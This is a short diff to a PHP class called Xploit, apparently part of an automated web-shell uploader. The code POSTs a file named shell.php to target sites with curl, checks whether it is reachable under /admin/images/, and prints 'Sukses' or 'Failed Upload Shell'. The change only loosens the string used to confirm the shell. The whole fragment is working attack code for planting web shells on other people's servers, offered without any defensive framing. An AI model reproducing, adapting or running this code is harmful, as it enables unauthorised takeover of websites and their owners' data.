@@ -32,7 +32,7 @@ class Xploit{
     if($this->oke($cc)->info == 200){
           @shell_exec("curl --silent --connect-timeout 5 -X POST -F 'uploadfile5=@shell.php' $cc");
           $shex = $a."/admin/images/shell.php";
-          if(preg_match("/IndoXploit/", $this->oke($shex)->exe) AND $this->oke($shex)->info == 200) {
+          if(preg_match("/shell/", $this->oke($shex)->exe) AND $this->oke($shex)->info == 200) {
                print "{$green}Sukses => $shex{$white}\n";
           } else {
                print "Failed Upload Shell => $a \n";}
